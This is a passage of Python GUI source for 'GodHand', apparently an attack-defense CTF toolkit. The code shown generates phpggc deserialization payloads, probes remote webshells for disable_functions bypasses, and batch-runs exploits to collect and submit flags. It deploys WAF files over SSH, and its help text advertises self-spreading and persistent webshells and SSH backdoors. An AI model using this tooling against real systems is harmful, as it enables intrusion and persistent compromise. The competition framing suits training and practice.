        raw = self.ggc_params.get()
        if not chain or not raw:
            return
        parts = raw.strip().split()
        cmd = parts[0]
        args = parts[1:] if len(parts) > 1 else []
        enc = self.ggc_enc.get()
        try:
            _try_add_path(os.path.join(BASE, '攻击模块'))
            from phpggc_wrapper import generate_payload
            payload, err = generate_payload(chain, cmd, *args, encoding=None if enc == 'raw' else enc)
            if payload:
                self.ggc_out.delete(1.0, tk.END)
                self.ggc_out.insert(1.0, payload)
                self.ggc_log.log(f'[+] Payload 生成成功 ({len(payload)} 字节)')
            else:
                self.ggc_log.log(f'[-] 生成失败: {err}')
        except Exception as e:
            self.ggc_log.log(f'[-] {e}')

    def df_check(self):
        url = self.df_url.get().strip()
        pw = self.df_pass.get().strip()
        if not url:
            return
        try:
            _try_add_path(os.path.join(BASE, '攻击模块'))
            from dfunc_bypass import check_remote
            self.df_log.log(f'[+] 检测 {url}...')
            info, suggestions = check_remote(url, pw)
            if not info:
                self.df_log.log('[-] 连接失败或返回异常')
                return
            for i in self.df_tree.get_children():
                self.df_tree.delete(i)
            for s in suggestions:
                self.df_tree.insert('', tk.END, values=(s['method'], s['desc'], s['payload'][:80]))
            self.df_log.log(f'[+] 找到 {len(suggestions)} 种可用绕过方法')
        except Exception as e:
            self.df_log.log(f'[-] {e}')

    def df_parse_pi(self):
        url = self.df_phpinfo.get().strip()
        if not url:
            return
        try:
            _try_add_path(os.path.join(BASE, '攻击模块'))
            from dfunc_bypass import check_by_phpinfo, suggest_bypass
            info = check_by_phpinfo(url)
            if not info:
                self.df_log.log('[-] 无法解析phpinfo')
                return
            self.df_log.log(f"[+] PHP版本: {info.get('php_version', '?')} | 禁用函数: {len(info.get('disabled_functions', []))} 个")
            for i in self.df_tree.get_children():
                self.df_tree.delete(i)
            for s in suggest_bypass(info):
                self.df_tree.insert('', tk.END, values=(s['method'], s['desc'], s['payload'][:80]))
        except Exception as e:
            self.df_log.log(f'[-] {e}')

    def br_load(self):
        from tkinter import filedialog
        fp = filedialog.askopenfilename(title='选择目标文件')
        if fp:
            with open(fp) as f:
                self.br_targets.delete(1.0, tk.END)
                self.br_targets.insert(1.0, f.read())

    def br_run(self):
        targets_raw = self.br_targets.get(1.0, tk.END).strip()
        if not targets_raw:
            return
        try:
            _try_add_path(os.path.join(BASE, '攻击模块'))
            from batch_runner import BatchRunner
            br = BatchRunner(exploit_cmd=self.br_cmd.get().strip(), flag_regex=self.br_re.get().strip(), submit_url=self.br_sub.get().strip() or None, submit_token=self.br_tok.get().strip() or None)
            for line in targets_raw.splitlines():
                line = line.strip()
                if ':' in line:
                    parts = line.split(':')
                    br.add_target(parts[0], int(parts[1]))
                elif line:
                    br.add_target(line, 80)
            self.br_log.log(f'[+] 加载 {len(br.targets)} 个目标, 并发 {self.br_workers.get()}')

            def task():
                br.run_all(max_workers=int(self.br_workers.get()))
                self.root.after(0, lambda: self.br_log.log(f'[+] {br.summary()}'))
                if br.flags:
                    dedup = set(br.flags)
                    self.root.after(0, lambda: self.br_log.log(f'[+] 获取到 {len(dedup)} 个去重Flag'))
                    for f in list(dedup)[:5]:
                        self.root.after(0, lambda f=f: self.br_log.log(f'    {f}'))
                    if br.submit_url:
                        res = br.submit_flags()
                        self.root.after(0, lambda: self.br_log.log(f"[+] 提交结果: {sum((1 for r in res if r['status'] == 'ok'))}/{len(res)}"))
            import threading
            _GodHandThread(target=task, daemon=True).start()
        except Exception as e:
            self.br_log.log(f'[-] {e}')

    def _domain_init(self, parent, log_func):
        self.parent = parent
        self.log = log_func
    _fields = {'ggc_chain': {'kind': 'value', 'default': ''}, 'ggc_params': {'kind': 'value', 'default': ''}, 'ggc_enc': {'kind': 'value', 'default': ''}, 'ggc_out': {'kind': 'text', 'default': ''}, 'df_url': {'kind': 'value', 'default': ''}, 'df_pass': {'kind': 'value', 'default': 'cmd'}, 'df_phpinfo': {'kind': 'value', 'default': ''}, 'df_tree': {'kind': 'table'}, 'br_targets': {'kind': 'text', 'default': ''}, 'br_cmd': {'kind': 'value', 'default': 'python exploit.py {ip} {port}'}, 'br_re': {'kind': 'value', 'default': 'flag\\{[^}]+\\}'}, 'br_sub': {'kind': 'value', 'default': ''}, 'br_tok': {'kind': 'value', 'default': ''}, 'parent': {'kind': 'value', 'default': ''}, 'log': {'kind': 'value', 'default': ''}, 'ggc_log': {'kind': 'log'}, 'df_log': {'kind': 'log'}, 'br_workers': {'kind': 'value', 'default': ''}, 'br_log': {'kind': 'log'}, 'ggc_chains_list': {'kind': 'value', 'default': ''}, 'root': {'kind': 'value', 'default': ''}}

class AWDToolkit(ActorState):

    def _apply_conn(self):
        """将全局连接参数应用到当前标签页"""
        tabs = [('WAF管理', self.waf), ('Flag获取', self.flag), ('靶机监控', self.mon), ('木马上传', self.creep)]
        ip = self.global_ip.get().strip()
        port = self.global_port.get().strip()
        shell = self.global_shell.get().strip()
        pwd = self.global_pass.get().strip()
        ssh_port = self.global_ssh_port.get().strip() or '2202'
        ssh_user = self.global_ssh_user.get().strip() or 'ctf'
        mode = self.global_conn_mode.get()
        for name, tab in tabs:
            if not tab:
                continue
            try:
                if hasattr(tab, 'e_ip') and ip:
                    tab.e_ip.delete(0, tk.END)
                    tab.e_ip.insert(0, ip)
                if hasattr(tab, 'e_port'):
                    tab.e_port.delete(0, tk.END)
                    tab.e_port.insert(0, port)
                if hasattr(tab, 'entry_port'):
                    tab.entry_port.delete(0, tk.END)
                    tab.entry_port.insert(0, port)
                if hasattr(tab, 'entry_shell') and shell:
                    tab.entry_shell.delete(0, tk.END)
                    tab.entry_shell.insert(0, shell)
                if hasattr(tab, 'e_surl') and shell:
                    tab.e_surl.delete(0, tk.END)
                    tab.e_surl.insert(0, shell)
                if hasattr(tab, 'e_shell_url') and shell:
                    tab.e_shell_url.delete(0, tk.END)
                    tab.e_shell_url.insert(0, shell)
                if hasattr(tab, 'entry_pass') and pwd:
                    tab.entry_pass.delete(0, tk.END)
                    tab.entry_pass.insert(0, pwd)
                if hasattr(tab, 'e_spass') and pwd:
                    tab.e_spass.delete(0, tk.END)
                    tab.e_spass.insert(0, pwd)
                if hasattr(tab, 'e_shell_pass') and pwd:
                    tab.e_shell_pass.delete(0, tk.END)
                    tab.e_shell_pass.insert(0, pwd)
                if hasattr(tab, 'e_target') and ip:
                    tab.e_target.delete(0, tk.END)
                    tab.e_target.insert(0, ip)
                if hasattr(tab, 'e_ssh_host') and ip:
                    tab.e_ssh_host.delete(0, tk.END)
                    tab.e_ssh_host.insert(0, ip)
                if hasattr(tab, 'e_ssh_port'):
                    tab.e_ssh_port.delete(0, tk.END)
                    tab.e_ssh_port.insert(0, ssh_port)
                if hasattr(tab, 'e_ssh_user'):
                    tab.e_ssh_user.delete(0, tk.END)
                    tab.e_ssh_user.insert(0, ssh_user)
                if hasattr(tab, 'e_ssh_pass') and pwd:
                    tab.e_ssh_pass.delete(0, tk.END)
                    tab.e_ssh_pass.insert(0, pwd)
                if hasattr(tab, 'creep_conn_mode'):
                    if mode == 'ssh':
                        tab.creep_conn_mode.set('ssh')
                        if hasattr(tab, 'e_creep_ssh_host') and ip:
                            tab.e_creep_ssh_host.delete(0, tk.END)
                            tab.e_creep_ssh_host.insert(0, ip)
                        if hasattr(tab, 'e_creep_ssh_port'):
                            tab.e_creep_ssh_port.delete(0, tk.END)
                            tab.e_creep_ssh_port.insert(0, ssh_port)
                        if hasattr(tab, 'e_creep_ssh_user'):
                            tab.e_creep_ssh_user.delete(0, tk.END)
                            tab.e_creep_ssh_user.insert(0, ssh_user)
                        if hasattr(tab, 'e_creep_ssh_pass') and pwd:
                            tab.e_creep_ssh_pass.delete(0, tk.END)
                            tab.e_creep_ssh_pass.insert(0, pwd)
                    else:
                        pass
                if hasattr(tab, 'conn_mode'):
                    tab.conn_mode.set(mode)
                if hasattr(tab, 'password') and pwd:
                    tab.password.set(pwd)
                if hasattr(tab, 'target_url') and ip:
                    mon_path = '/target_monitor.php'
                    if shell and 'target_monitor.php' in shell:
                        mon_path = shell
                    tab.target_url.set(f'http://{ip}:{port}{mon_path}')
                if hasattr(tab, '_switch_conn_mode'):
                    tab._switch_conn_mode()
                if ip or pwd:
                    tab._prefill_ssh = {'host': ip, 'port': ssh_port, 'user': ssh_user, 'pwd': pwd, 'webdir': getattr(tab, 'e_ssh_webdir', None) and tab.e_ssh_webdir.get().strip() or '/var/www/html'}
            except Exception:
                pass
        self.status_bar.config(text=f'✅ 已应用到 {len(tabs)} 个标签页')
        self._apply_conn_ops(ip, port, shell, pwd, ssh_port, ssh_user)

    def _apply_conn_ops(self, ip, port, shell, pwd, ssh_port, ssh_user):
        """将全局连接应用到综合运维(备份/数据库/加固/自动修复/黑名单/定时备份)"""
        ops = getattr(self, 'ops', None)
        if not ops:
            return

        def _set(w, val):
            try:
                if w is not None and val:
                    w.delete(0, tk.END)
                    w.insert(0, val)
            except Exception:
                pass
        try:
            _set(getattr(ops, 'bak_ssh_host', None), ip)
            _set(getattr(ops, 'bak_ssh_port', None), ssh_port)
            _set(getattr(ops, 'bak_ssh_user', None), ssh_user)
            _set(getattr(ops, 'bak_ssh_pass', None), pwd)
            _set(getattr(ops, 'db_ip', None), ip)
            _set(getattr(ops, 'db_ssh_port', None), ssh_port)
            _set(getattr(ops, 'db_ssh_user', None), ssh_user)
            _set(getattr(ops, 'db_ssh_pass', None), pwd)
            _set(getattr(ops, 'harden_ip', None), ip)
            _set(getattr(ops, 'harden_port', None), port)
            _set(getattr(ops, 'af_ip', None), ip)
            _set(getattr(ops, 'af_port', None), port)
            _set(getattr(ops, 'af_shell', None), shell)
            _set(getattr(ops, 'af_pass', None), pwd)
            _set(getattr(ops, 'ban_ip_entry', None), ip)
            _set(getattr(ops, 'sb_ssh_host', None), ip)
            _set(getattr(ops, 'sb_ssh_port', None), ssh_port)
            _set(getattr(ops, 'sb_ssh_user', None), ssh_user)
            _set(getattr(ops, 'sb_ssh_pass', None), pwd)
            ops._prefill_ssh = {'host': ip, 'port': ssh_port, 'user': ssh_user, 'pwd': pwd, 'webdir': '/var/www/html'}
            try:
                mode = self.global_conn_mode.get()
                if hasattr(ops, 'bak_mode'):
                    ops.bak_mode.set('ssh' if mode == 'ssh' else 'local')
                    ops._switch_bak_mode()
                if hasattr(ops, 'sb_mode'):
                    ops.sb_mode.set('ssh' if mode == 'ssh' else 'local')
                    ops._switch_sb_mode()
            except Exception:
                pass
        except Exception:
            pass

    def _refresh_status(self):
        """刷新所有靶机状态（简化版）"""
        self.status_bar.config(text='🔄 正在刷新状态...')

        def _check():
            try:
                ip = self.global_ip.get().strip()
                if not ip:
                    return
                import urllib.request, ssl
                ctx = ssl._create_unverified_context()
                results = []
                try:
                    r = urllib.request.urlopen(f'http://{ip}:80/', timeout=3, context=ctx)
                    results.append(f"Web:{('✅' if r.status == 200 else '❌')}")
                except Exception:
                    try:
                        r = urllib.request.urlopen(f'http://{ip}:8804/', timeout=3, context=ctx)
                        results.append(f"Web:{('✅' if r.status == 200 else '❌')}")
                    except Exception:
                        try:
                            r = urllib.request.urlopen(f'http://{ip}:8802/', timeout=3, context=ctx)
                            results.append(f"Web:{('✅' if r.status == 200 else '❌')}")
                        except Exception:
                            results.append('Web:❌')
                try:
                    import socket
                    s = socket.socket()
                    s.settimeout(3)
                    s.connect((ip, int(self.global_ssh_port.get().strip() or 2202)))
                    s.close()
                    results.append('SSH:✅')
                except Exception:
                    results.append('SSH:❌')
                self.root.after(0, lambda: self.status_bar.config(text=' | '.join(results)))
            except Exception:
                self.root.after(0, lambda: self.status_bar.config(text='状态刷新失败'))
        import threading
        _GodHandThread(target=_check, daemon=True).start()

    def _one_click_workflow(self):
        """一键工作流：先弹SSH配置窗口, 确认后部署WAF+监控文件+开始监控"""
        pre = {'host': self.global_ip.get().strip(), 'port': self.global_ssh_port.get().strip() or '2202', 'user': self.global_ssh_user.get().strip() or 'ctf', 'pwd': self.global_pass.get().strip(), 'webdir': '/var/www/html'}
        ssh_deploy_dialog(self.root, '⚡ 一键部署监控+WAF', '输入SSH信息, 自动部署 target_monitor.php + WAF 并启动监控', [('SSH地址:', 'host', pre['host'], ''), ('SSH端口:', 'port', pre['port'], ''), ('用户名:', 'user', pre['user'], ''), ('密码:', 'pwd', pre['pwd'], '*'), ('Web目录:', 'webdir', pre['webdir'], '')], self._run_workflow)

    def _run_workflow(self, vals):
        host = vals.get('host') or self.global_ip.get().strip()
        port = self.global_port.get().strip() or '80'
        pwd = vals.get('pwd') or self.global_pass.get().strip()
        ssh_user = vals.get('user') or 'ctf'
        ssh_port_str = vals.get('port') or '2202'
        web_dir_input = vals.get('webdir') or '/var/www/html'
        if not host:
            messagebox.showerror('错误', '请先填写目标IP')
            return
        self.status_bar.config(text='🚀 一键工作流启动...')
        self._log_workflow('🚀 一键工作流启动: SSH连接 %s:%s (用户 %s)' % (host, ssh_port_str, ssh_user))
        state = {'ssh': None}

        def _kill():
            try:
                if state['ssh']:
                    try:
                        state['ssh'].close()
                    except Exception:
                        pass
            except Exception:
                pass
            self.root.after(0, lambda: self.status_bar.config(text='❌ 部署超时(120s)已中断'))
        watchdog = threading.Timer(120, _kill)
        watchdog.daemon = True
        watchdog.start()

        def _run():
            try:
                import paramiko, os, time
                ssh = paramiko.SSHClient()
                state['ssh'] = ssh
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                last_err = None
                try:
                    ssh_port = int(ssh_port_str) if str(ssh_port_str).strip() else 2202
                except Exception:
                    ssh_port = 2202
                for attempt in range(3):
                    try:
                        ssh.connect(host, port=ssh_port, username=ssh_user, password=pwd, timeout=10, allow_agent=False, look_for_keys=False, banner_timeout=15)
                        break
                    except Exception as ce:
                        last_err = ce
                        time.sleep(2)
                else:
                    err_s = str(last_err)
                    el = err_s.lower()
                    if 'timed out' in el or 'unreachable' in el or 'refused' in el or ('no route' in el):
                        raise RuntimeError(f'靶机不可达[{host}:{ssh_port}] 连接超时/被拒 — 靶机未启动或网络不通(非密码问题)')
                    if 'authentication' in el:
                        raise RuntimeError(f'SSH认证失败[{host}:{ssh_port} 用户:{ssh_user}] — 用户名或密码错误: {err_s[:50]}')
                    raise RuntimeError(f'SSH连接失败[{host}:{ssh_port}] (已重试3次): {err_s[:80]}')
                tr = ssh.get_transport()
                if tr:
                    tr.sock.settimeout(30)
                    tr.banner_timeout = 15
                sftp = None
                for attempt in range(3):
                    try:
                        sftp = ssh.open_sftp()
                        sftp.get_channel().settimeout(30)
                        break
                    except Exception as ce:
                        last_err = ce
                        time.sleep(2)
                if sftp is None:
                    raise RuntimeError(f'SFTP连接失败(已重试3次): {str(last_err)[:80]}')
                base = BASE
                report = []
                self.root.after(0, lambda: self.status_bar.config(text='🚀 探测Web目录...'))
                web_dir = web_dir_input
                detect_cmd = 'for d in /app /app/web /var/www/html /var/www /web /www /opt/web /srv/www /home/ctf/web /home/ctf/www; do [ -d "$d" ] && echo "$d" && break; done'
                try:
                    _, so, _ = ssh.exec_command(detect_cmd, timeout=15)
                    so.channel.settimeout(15)
                    out = (so.read().decode('utf-8', 'replace') or '').strip().splitlines()
                    if out and out[0].strip():
                        web_dir = out[0].strip()
                    else:
                        _, so2, se2 = ssh.exec_command('mkdir -p /var/www/html && chmod 777 /var/www/html', timeout=15)
                        so2.channel.settimeout(15)
                        if so2.channel.recv_exit_status() != 0:
                            err2 = (se2.read().decode('utf-8', 'replace') or '').strip()
                            raise RuntimeError(f"无法创建 /var/www/html: {err2 or '权限不足'}")
                except Exception as de:
                    raise RuntimeError(f'Web目录探测失败: {str(de)[:60]}')
                web_dir = web_dir.rstrip('/')
                mon_php = os.path.join(base, '上传靶机', 'target_monitor.php')
                if os.path.exists(mon_php):
                    self.root.after(0, lambda: self.status_bar.config(text='🚀 部署监控脚本...'))
                    with open(mon_php, 'r', encoding='utf-8', errors='replace') as f:
                        content = f.read()
                    content = content.replace('y|lladmin121.@ss', pwd)
                    content = content.replace("$P='1ffd501f923a54275c3137b6aa362627'", "$P='" + pwd + "'")
                    with sftp.open(f'{web_dir}/target_monitor.php', 'w') as fh:
                        fh.write(content)
                    report.append(f'✅ 监控脚本 -> {web_dir}')
                waf_php = os.path.join(base, '上传靶机', 'waf_strong.php')
                waf_dat = os.path.join(base, '上传靶机', '.waf.dat')
                if os.path.exists(waf_php):
                    self.root.after(0, lambda: self.status_bar.config(text='🚀 部署WAF...'))
                    waf_content = render_waf_strong()
                    if waf_content is None:
                        with open(waf_php, 'r', encoding='utf-8', errors='replace') as f:
                            waf_content = f.read()
                    with sftp.open(f'{web_dir}/waf_strong.php', 'w') as f:
                        f.write(waf_content)
                    report.append('✅ WAF文件')
                dat_content = None
                try:
                    dat_content = self.waf.build_waf_dat()
                except Exception:
                    pass
                if dat_content is None and os.path.exists(waf_dat):
                    with open(waf_dat, 'r', encoding='utf-8', errors='replace') as f:
                        dat_content = f.read()
                if dat_content:
                    with sftp.open(f'{web_dir}/.waf.dat.php', 'w') as f:
                        f.write(dat_content)
                    try:
                        sftp.remove(f'{web_dir}/.waf.dat')
                    except Exception:
                        pass
                    report.append('✅ WAF规则')
                try:
                    with sftp.open(f'{web_dir}/.user.ini', 'w') as f:
                        f.write('auto_prepend_file=waf_strong.php\n')
                    with sftp.open(f'{web_dir}/.htaccess', 'w') as f:
                        f.write(_waf_htaccess())
                except Exception:
                    pass
                ban_content = render_waf_ban()
                if ban_content:
                    with sftp.open(f'{web_dir}/waf_ban.php', 'w') as f:
                        f.write(ban_content)
                    report.append('✅ 黑名单脚本')
                try:
                    _, bso, _ = ssh.exec_command(f'chmod 644 {web_dir}/waf_strong.php {web_dir}/.waf.dat.php {web_dir}/waf_ban.php {web_dir}/.htaccess {web_dir}/.user.ini 2>/dev/null; echo CHMOD_DONE', timeout=15)
                    bso.channel.settimeout(15)
                    bso.read()
                except Exception:
                    pass
                try:
                    mmsg = self.waf._auto_mount_waf(ssh, web_dir)
                    if mmsg:
                        report.append(mmsg)
                except Exception:
                    pass
                sftp.close()
                self.root.after(0, lambda: self.mon.password.set(pwd) if hasattr(self.mon, 'password') else None)
                self.root.after(0, lambda: self.status_bar.config(text='🔎 验证监控URL...'))
                base_url = None
                try:
                    import urllib.request, urllib.parse as _up
                    rels = ['']
                    if web_dir.strip('/'):
                        rels.append('/' + web_dir.strip('/').split('/')[-1])
                    probe_ports = []
                    gp = str(port).strip() if port else ''
                    if gp and gp not in ('80',):
                        probe_ports.append(gp)
                    probe_ports += ['8804', '8802', '8080', '80']
                    for p in probe_ports:
                        if base_url:
                            break
                        for rel in rels:
                            test = f'http://{host}:{p}{rel}/target_monitor.php'
                            try:
                                q = _up.urlencode({'u': 'monitor', 'p': pwd, 'ajax': '1', '_': '0'})
                                resp = urllib.request.urlopen(test + '?' + q, timeout=5)
                                body = resp.read(800)
                                if resp.status == 200 and b'lines' in body:
                                    base_url = test
                                    break
                            except Exception:
                                continue
                except Exception:
                    pass
                if not base_url:
                    if port and str(port).strip():
                        base_url = f'http://{host}:{port}/target_monitor.php'
                    else:
                        base_url = f'http://{host}:8802/target_monitor.php'
                if hasattr(self.mon, 'target_url'):
                    self.mon.target_url.set(base_url)
                    self.mon.password.set(pwd)
                ssh.close()
                watchdog.cancel()
                self.root.after(0, lambda: self.status_bar.config(text=' | '.join(report) + ' | 🟢 就绪'))
                self.root.after(0, lambda: messagebox.showinfo('一键部署', '\n'.join(report) + '\n\n点「▶ 开始」启动监控'))
                self.root.after(0, lambda: self._log_workflow('✅ 一键部署完成: ' + ' | '.join(report)))
            except Exception as e:
                watchdog.cancel()
                self.root.after(0, lambda e=e: self.status_bar.config(text=f'❌ 部署失败: {str(e)[:60]}'))
                self.root.after(0, lambda e=e: self._log_workflow('❌ 一键部署失败: ' + str(e)[:100]))
                self.root.after(0, lambda e=e: messagebox.showerror('一键部署失败', f'部署流程出错:\n{e}\n\n检查: ①靶机网络是否可达(靶机没启动/网络不通时连不上) ②SSH端口是否正确 ③SSH用户/密码 ④Web目录权限'))
        _GodHandThread(target=_run, daemon=True).start()

    def _log_workflow(self, msg):
        try:
            if self.dash and hasattr(self.dash, 'log_activity'):
                self.dash.log_activity(msg)
        except Exception:
            pass

    def show_help(self):
        win = tb.Toplevel(self.root)
        win.title('GodHand — 使用帮助')
        win.geometry('750x650')
        win.minsize(500, 400)
        win.transient(self.root)
        win.grab_set()
        text = scrolledtext.ScrolledText(win, font=('Consolas', 10), bg='#0a0e17', fg='#c8d6f0', insertbackground='white', wrap=tk.WORD, padx=10, pady=10, state=tk.DISABLED)
        text.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)
        for t, c in [('h1', '#c084fc'), ('h2', '#00d4ff'), ('text', '#c8d6f0'), ('code', '#00ff9d'), ('warn', '#ffcc00'), ('sep', '#555555'), ('red', '#ff4d6d'), ('green', '#00ff9d')]:
            text.tag_config(t, foreground=c, spacing1=2, spacing2=1)
        text.tag_config('h1', font=('Consolas', 13, 'bold'), spacing3=8)
        text.tag_config('h2', font=('Consolas', 11, 'bold'), spacing3=6)
        text.tag_config('code', font=('Consolas', 9))
        text.tag_config('sep', font=('Consolas', 7))
        HELP = '══════════════════════════════════════════════════════════\n GodHand 作战指挥台 v1.3.0\n AWD 攻防演练统一管理平台\n══════════════════════════════════════════════════════════\n\n╔══════════════════════════════════════════════════════════╗\n║  本工具仅用于授权安全测试，请遵守相关法律法规        ║\n╚══════════════════════════════════════════════════════════╝\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n                        免 责 声 明\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n1. 本工具仅限用于经授权的安全测试、CTF竞赛、AWD攻防演练等合法场景\n2. 严禁用于未经授权的网络攻击、入侵、数据窃取等违法行为\n3. 使用者需自行承担所有法律责任，开发者不承担任何连带责任\n4. 下载、安装、使用本工具即视为已阅读并同意以上条款\n5. 如有违反，一切后果由使用者自行承担\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n                        功 能 介 绍\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n▸ 📊 Dashboard 总览\n  · 全局状态卡片：目标数/存活数/Flag数/告警数/WAF部署/木马植入\n  · 快捷操作：部署WAF/获取Flag/一键加固/备份网站\n  · 活动趋势图 + 操作日志实时记录\n\n▸ 🛡️ WAF管理\n  · 批量部署 WAF 防护脚本到多个靶机\n  · 检查/更新/卸载 WAF 状态\n  · 执行日志/规则编辑/攻击流量分析/心跳监控\n\n▸ 🎯 Flag获取\n  · 周期性批量读取靶机 Flag\n  · 支持 RSA 加密通信 + 流量混淆\n  · 自动提交到平台 + 手动提交模式\n\n▸ 💡 靶机监控\n  · 实时监控文件变更/连接/告警\n  · 攻击者TOP排行\n  · 文件管理（浏览/编辑/上传/下载）\n\n▸ 🕷️ 木马上传\n  · 蠕虫马(自复制)/不死马(常驻)/MD5马(免杀)/内存马(无文件)\n  · 一键植入/部署/扩散/清除\n  · SSH后门 + 心跳检测\n\n▸ 🔧 综合运维\n  · 备份还原/木马查杀/数据库/加固基线\n  · 木马查杀/数据库/加固基线/自动修复\n  · IP黑名单/定时备份\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n                       产 品 说 明\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n  产品: GodHand\n  版本: 1.3.0\n  来源与鸣谢: docs/来源与鸣谢.md\n  用途: AWD攻防演练 / 安全测试 / CTF竞赛\n\n══════════════════════════════════════════════════════════\n              Powered by ttkbootstrap · Python\n══════════════════════════════════════════════════════════'
        text.config(state=tk.NORMAL)
        text.insert(tk.END, HELP)
        text.config(state=tk.DISABLED)
        tb.Button(win, text='关闭', command=win.destroy).pack(pady=(0, 8))

    def _refresh_dashboard(self):
        if self._closing:
            return
        if getattr(self, 'dash', None) is not None:
            records = list(getattr(self.waf, 'results', []))
            targets = {str(item[0]) for item in records if isinstance(item, (list, tuple)) and item}
            machines = getattr(getattr(self, 'machines', None), 'machines', [])
            targets.update((str(item.get('ip')) for item in machines if isinstance(item, dict) and item.get('ip')))
            monitor_url = urllib.parse.urlparse(self.mon.target_url.get().strip())
            if monitor_url.hostname:
                targets.add(monitor_url.hostname)
            alive = int(self.mon.monitoring and time.monotonic() - getattr(self.mon, '_last_success', 0) < 15)
            values = dict(total_targets=len(targets), alive_targets=alive, total_flags=len(getattr(self.flag, 'known', [])), total_alerts=self.mon.new_alerts, total_waf=sum((bool(item[1]) for item in records if isinstance(item, (list, tuple)) and len(item) > 1)))
            if values != getattr(self, '_last_dashboard_values', None):
                self.dash.update_stats(**values)
                self._last_dashboard_values = values
        self.root.after(1000, self._refresh_dashboard)

    def on_close(self):
        if getattr(self, '_closing', False):
            return
        self._closing = True
        for tab_name in ('waf', 'mon', 'creep', 'ops', 'flag'):
            tab = getattr(self, tab_name, None)
            if tab is None:
                continue
            for flag in ('running', 'monitoring', 'hb_running', 'c_hb_running', 'sb_running', 'hunting'):
                if hasattr(tab, flag):
                    setattr(tab, flag, False)
            for event in ('_monitor_stop', '_hb_stop', '_creep_hb_stop', '_sb_stop'):
                stopper = getattr(tab, event, None)
                if stopper is not None:
                    stopper.set()
        for tab_name, method in [('mon', 'save_config'), ('flag', 'stop_hunt'), ('flag', 'save_known'), ('flag', 'save_config'), ('waf', 'save_config'), ('creep', 'save_cfg')]:
            try:
                getattr(getattr(self, tab_name), method)()
            except Exception as exc:
                _record_error('close/save', type(exc), exc, exc.__traceback__)
        if getattr(self, 'dash', None) is not None and hasattr(self.dash, 'close'):
            self.dash.close()
        self._dispatcher.close()
        self.root.destroy()
    _fields = {'_closing': {'kind': 'literal', 'default': True}, 'global_conn_mode': {'kind': 'value', 'default': 'webshell'}, 'global_ip': {'kind': 'value', 'default': ''}, 'global_port': {'kind': 'value', 'default': '80'}, 'global_shell': {'kind': 'value', 'default': '/web/shell.php'}, 'global_pass': {'kind': 'value', 'default': 'cmd'}, 'global_ssh_port': {'kind': 'value', 'default': '2202'}, 'global_ssh_user': {'kind': 'value', 'default': 'ctf'}, 'root': {'kind': 'value', 'default': ''}, '_dispatcher': {'kind': 'value', 'default': ''}, '_banner_logo': {'kind': 'value', 'default': ''}, 'banner': {'kind': 'value', 'default': ''}, 'conn_frame': {'kind': 'value', 'default': ''}, 'btn_apply': {'kind': 'value', 'default': ''}, 'btn_refresh_status': {'kind': 'value', 'default': ''}, 'btn_workflow': {'kind': 'value', 'default': ''}, 'waf': {'kind': 'value', 'default': ''}, 'flag': {'kind': 'value', 'default': ''}, 'mon': {'kind': 'value', 'default': ''}, 'creep': {'kind': 'value', 'default': ''}, 'ops': {'kind': 'value', 'default': ''}, 'machines': {'kind': 'value', 'default': ''}, 'status_bar': {'kind': 'value', 'default': ''}, '_window_logo': {'kind': 'value', 'default': ''}, 'dash': {'kind': 'literal', 'default': None}, '_last_dashboard_values': {'kind': 'value', 'default': ''}}
def _factory_5444f870c03d(args, function, holder, self, token):

    def invoke():
        if holder:
            self._scheduled.discard(holder[0])
        if not self.closed and token not in self._cancelled:
            function(*args)
        self._cancelled.discard(token)
    return invoke
CLOSURES['UiDispatcher._schedule.<locals>.invoke@166']=_factory_5444f870c03d
def _factory_7659d1a59178(held, locks):

    def hold(path):
        if path not in held:
            locks.enter_context(_hold_directory(path))
            held.add(path)
    return hold
CLOSURES['restore_local_archive.<locals>.hold@281']=_factory_7659d1a59178
def _factory_d26abf3b30c6(ensure_directory, hold, root):

    def ensure_directory(path):
        if path == root:
            return
        ensure_directory(path.parent)
        _checked_target(root, path.relative_to(root).parts)
        path.mkdir(exist_ok=True)
        hold(path)
    return ensure_directory
CLOSURES['restore_local_archive.<locals>.ensure_directory@336']=_factory_d26abf3b30c6
def _factory_2d8b2d7c4ff2(on_deploy, vd, win):

    def do_it():
        vals = {k: v.get().strip() for k, v in vd.items()}
        has_ssh = bool(vals.get('host')) or bool(vals.get('pwd'))
        has_ws = bool(vals.get('sh_url')) and bool(vals.get('sh_pass'))
        if has_ssh and (not (vals.get('host') and vals.get('pwd'))):
            messagebox.showerror('错误', 'SSH地址和密码需同时填写')
            return
        if not has_ssh and (not has_ws):
            messagebox.showerror('错误', '请填写 SSH地址+密码，或 Shell路径+密码 二选一')
            return
        win.destroy()
        on_deploy(vals)
    return do_it
CLOSURES['ssh_deploy_dialog.<locals>.do_it@613']=_factory_2d8b2d7c4ff2
def _factory_c509098ea805(self, win):

    def do_deploy():
        host = self._waf_deploy_vars['host'].get().strip()
        port = self._waf_deploy_vars['port'].get().strip()
        user = self._waf_deploy_vars['user'].get().strip()
        pwd = self._waf_deploy_vars['pwd'].get().strip()
        web = self._waf_deploy_vars['web'].get().strip()
        if not host or not pwd:
            messagebox.showerror('错误', '请填写SSH地址和密码')
            return
        waf_candidates = [os.path.join(BASE, '上传靶机', 'waf_strong.php'), os.path.join(BASE, 'waf_strong.php'), os.path.join(os.path.dirname(sys.executable), '上传靶机', 'waf_strong.php'), os.path.join(os.path.dirname(sys.executable), 'waf_strong.php')]
        waf_php = None
        for p in waf_candidates:
            if os.path.exists(p):
                waf_php = p
                break
        dat_candidates = [os.path.join(BASE, '上传靶机', '.waf.dat'), os.path.join(BASE, '.waf.dat'), os.path.join(os.path.dirname(sys.executable), '上传靶机', '.waf.dat'), os.path.join(os.path.dirname(sys.executable), '.waf.dat')]
        waf_dat = None
        for p in dat_candidates:
            if os.path.exists(p):
                waf_dat = p
                break
        files = []
        waf_content = render_waf_strong()
